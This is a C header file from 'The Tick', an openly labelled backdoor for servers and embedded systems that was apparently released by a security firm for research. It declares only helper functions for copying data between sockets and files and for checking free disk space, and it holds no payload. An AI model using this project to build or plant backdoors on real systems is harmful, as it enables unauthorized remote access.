/*
 * The Tick, a simple backdoor for servers and embedded systems.
 * 
 * Developed by Mario Vilas, mvilas@gmail.com
 * http://www.github.com/MarioVilas/thetick
 * 
 * Originally released as open source by NCC Group Plc - http://www.nccgroup.com/
 * http://www.github.com/nccgroup/thetick
 * 
 * See the LICENSE file for further details.
*/

#ifndef FILE_H
#define FILE_H

#include <sys/types.h>

int copy_stream(int source, int destination, ssize_t count);
ssize_t get_free_space(const char *pathname);

// On Windows we cannot mix sockets and file descriptors.
// We need specialized functions for this.
#ifdef _WIN32
int copy_stream_socket_to_file(int sock, int fd, ssize_t count);
int copy_stream_file_to_socket(int fd, int sock, ssize_t count);
#else
#define copy_stream_socket_to_file copy_stream
#define copy_stream_file_to_socket copy_stream
#endif

#endif /* FILE_H */
